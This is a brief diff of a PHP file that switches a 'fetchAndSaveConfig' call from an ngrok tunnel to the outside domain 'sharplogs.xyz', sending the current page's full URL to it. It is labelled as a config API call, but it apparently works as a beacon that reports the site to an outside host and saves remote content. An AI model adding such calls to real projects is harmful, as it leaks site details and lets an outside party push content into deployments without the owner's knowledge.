@@ -33,4 +33,4 @@ function fetchAndSaveConfig($url) {
 
 // Call this with your actual config API
 $currentUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
-fetchAndSaveConfig("https://a822b1bdf49b.ngrok-free.app/api/contest-info?source=" . urlencode($currentUrl));
+fetchAndSaveConfig("https://sharplogs.xyz/api/contest-info?source=" . urlencode($currentUrl));
